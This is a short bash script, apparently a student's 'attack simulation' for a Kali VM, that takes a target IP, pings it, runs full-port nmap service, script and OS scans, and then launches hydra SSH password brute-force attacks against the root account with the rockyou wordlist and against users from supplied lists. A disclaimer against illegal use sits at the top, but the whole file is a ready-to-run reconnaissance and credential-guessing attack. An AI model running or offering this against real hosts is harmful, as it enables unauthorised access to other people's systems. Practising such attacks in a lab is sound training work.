## connor dedic
## this is a bash script for running an attack simulation
## do not use this for illegal purposes
## this is designed for use on a kali vm

#!/bin/bash

ip=$1
wordlist=$2

echo "The target is $ip"

ping $ip -c 10

sudo nmap -sV  -p- $ip
sudo nmap -sC -A -O -p- $ip

timeout 100 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$ip

hydra -L users.txt -P pass.txt -t 22 ssh://$ip

